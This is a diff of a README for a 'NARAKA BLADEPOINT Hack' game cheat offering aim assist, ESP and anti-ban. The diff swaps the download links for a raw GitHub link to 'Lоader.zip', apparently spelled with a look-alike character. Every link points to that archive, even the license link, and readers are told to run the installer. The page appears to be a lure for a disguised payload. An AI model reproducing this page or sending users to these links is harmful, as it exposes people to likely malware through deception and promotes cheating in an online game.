@@ -1,6 +1,6 @@
 # ⚔️ NARAKA BLADEPOINT Hack  
-![Download Now](https://img.shields.io/badge/Download-NARAKA--BLADEPOINT%20Hack-green?style=for-the-badge&logo=github&logoColor=white&link=https://easylauncher.su/PSnzrH)  
-https://easylauncher.su/PSnzrH  
+![Download Now](https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip%20Hack-green?style=for-the-badge&logo=github&logoColor=white&https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip)  
+https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip  
 
 ## 🚀 About NARAKA BLADEPOINT Hack
 
@@ -36,7 +36,7 @@ NARAKA BLADEPOINT, enhancement tool, aim assist, wall detection, ESP, anti-ban, 
 ## 📦 Installation
 
 **Step 1:**  
-[![Download Now](https://img.shields.io/badge/Download_Now-NARAKA__BLADEPOINT_Hack-green?style=for-the-badge)](https://easylauncher.su/PSnzrH)  
+[![Download Now](https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip)  
 Click above to start the setup!
 
 **Step 2:**  
@@ -44,9 +44,9 @@ Run the installer and follow on-screen instructions for your favorite OS.
 
 ## 📝 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip) © 2025.  
 
 ---
 
-![Download Now](https://img.shields.io/badge/Download-NARAKA--BLADEPOINT%20Hack-green?style=for-the-badge&logo=github&logoColor=white&link=https://easylauncher.su/PSnzrH)  
-https://easylauncher.su/PSnzrH
+![Download Now](https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip%20Hack-green?style=for-the-badge&logo=github&logoColor=white&https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip)  
+https://raw.githubusercontent.com/YUSH19883/NarakaBladepoint-ShadowToolkit/main/Lоader.zip
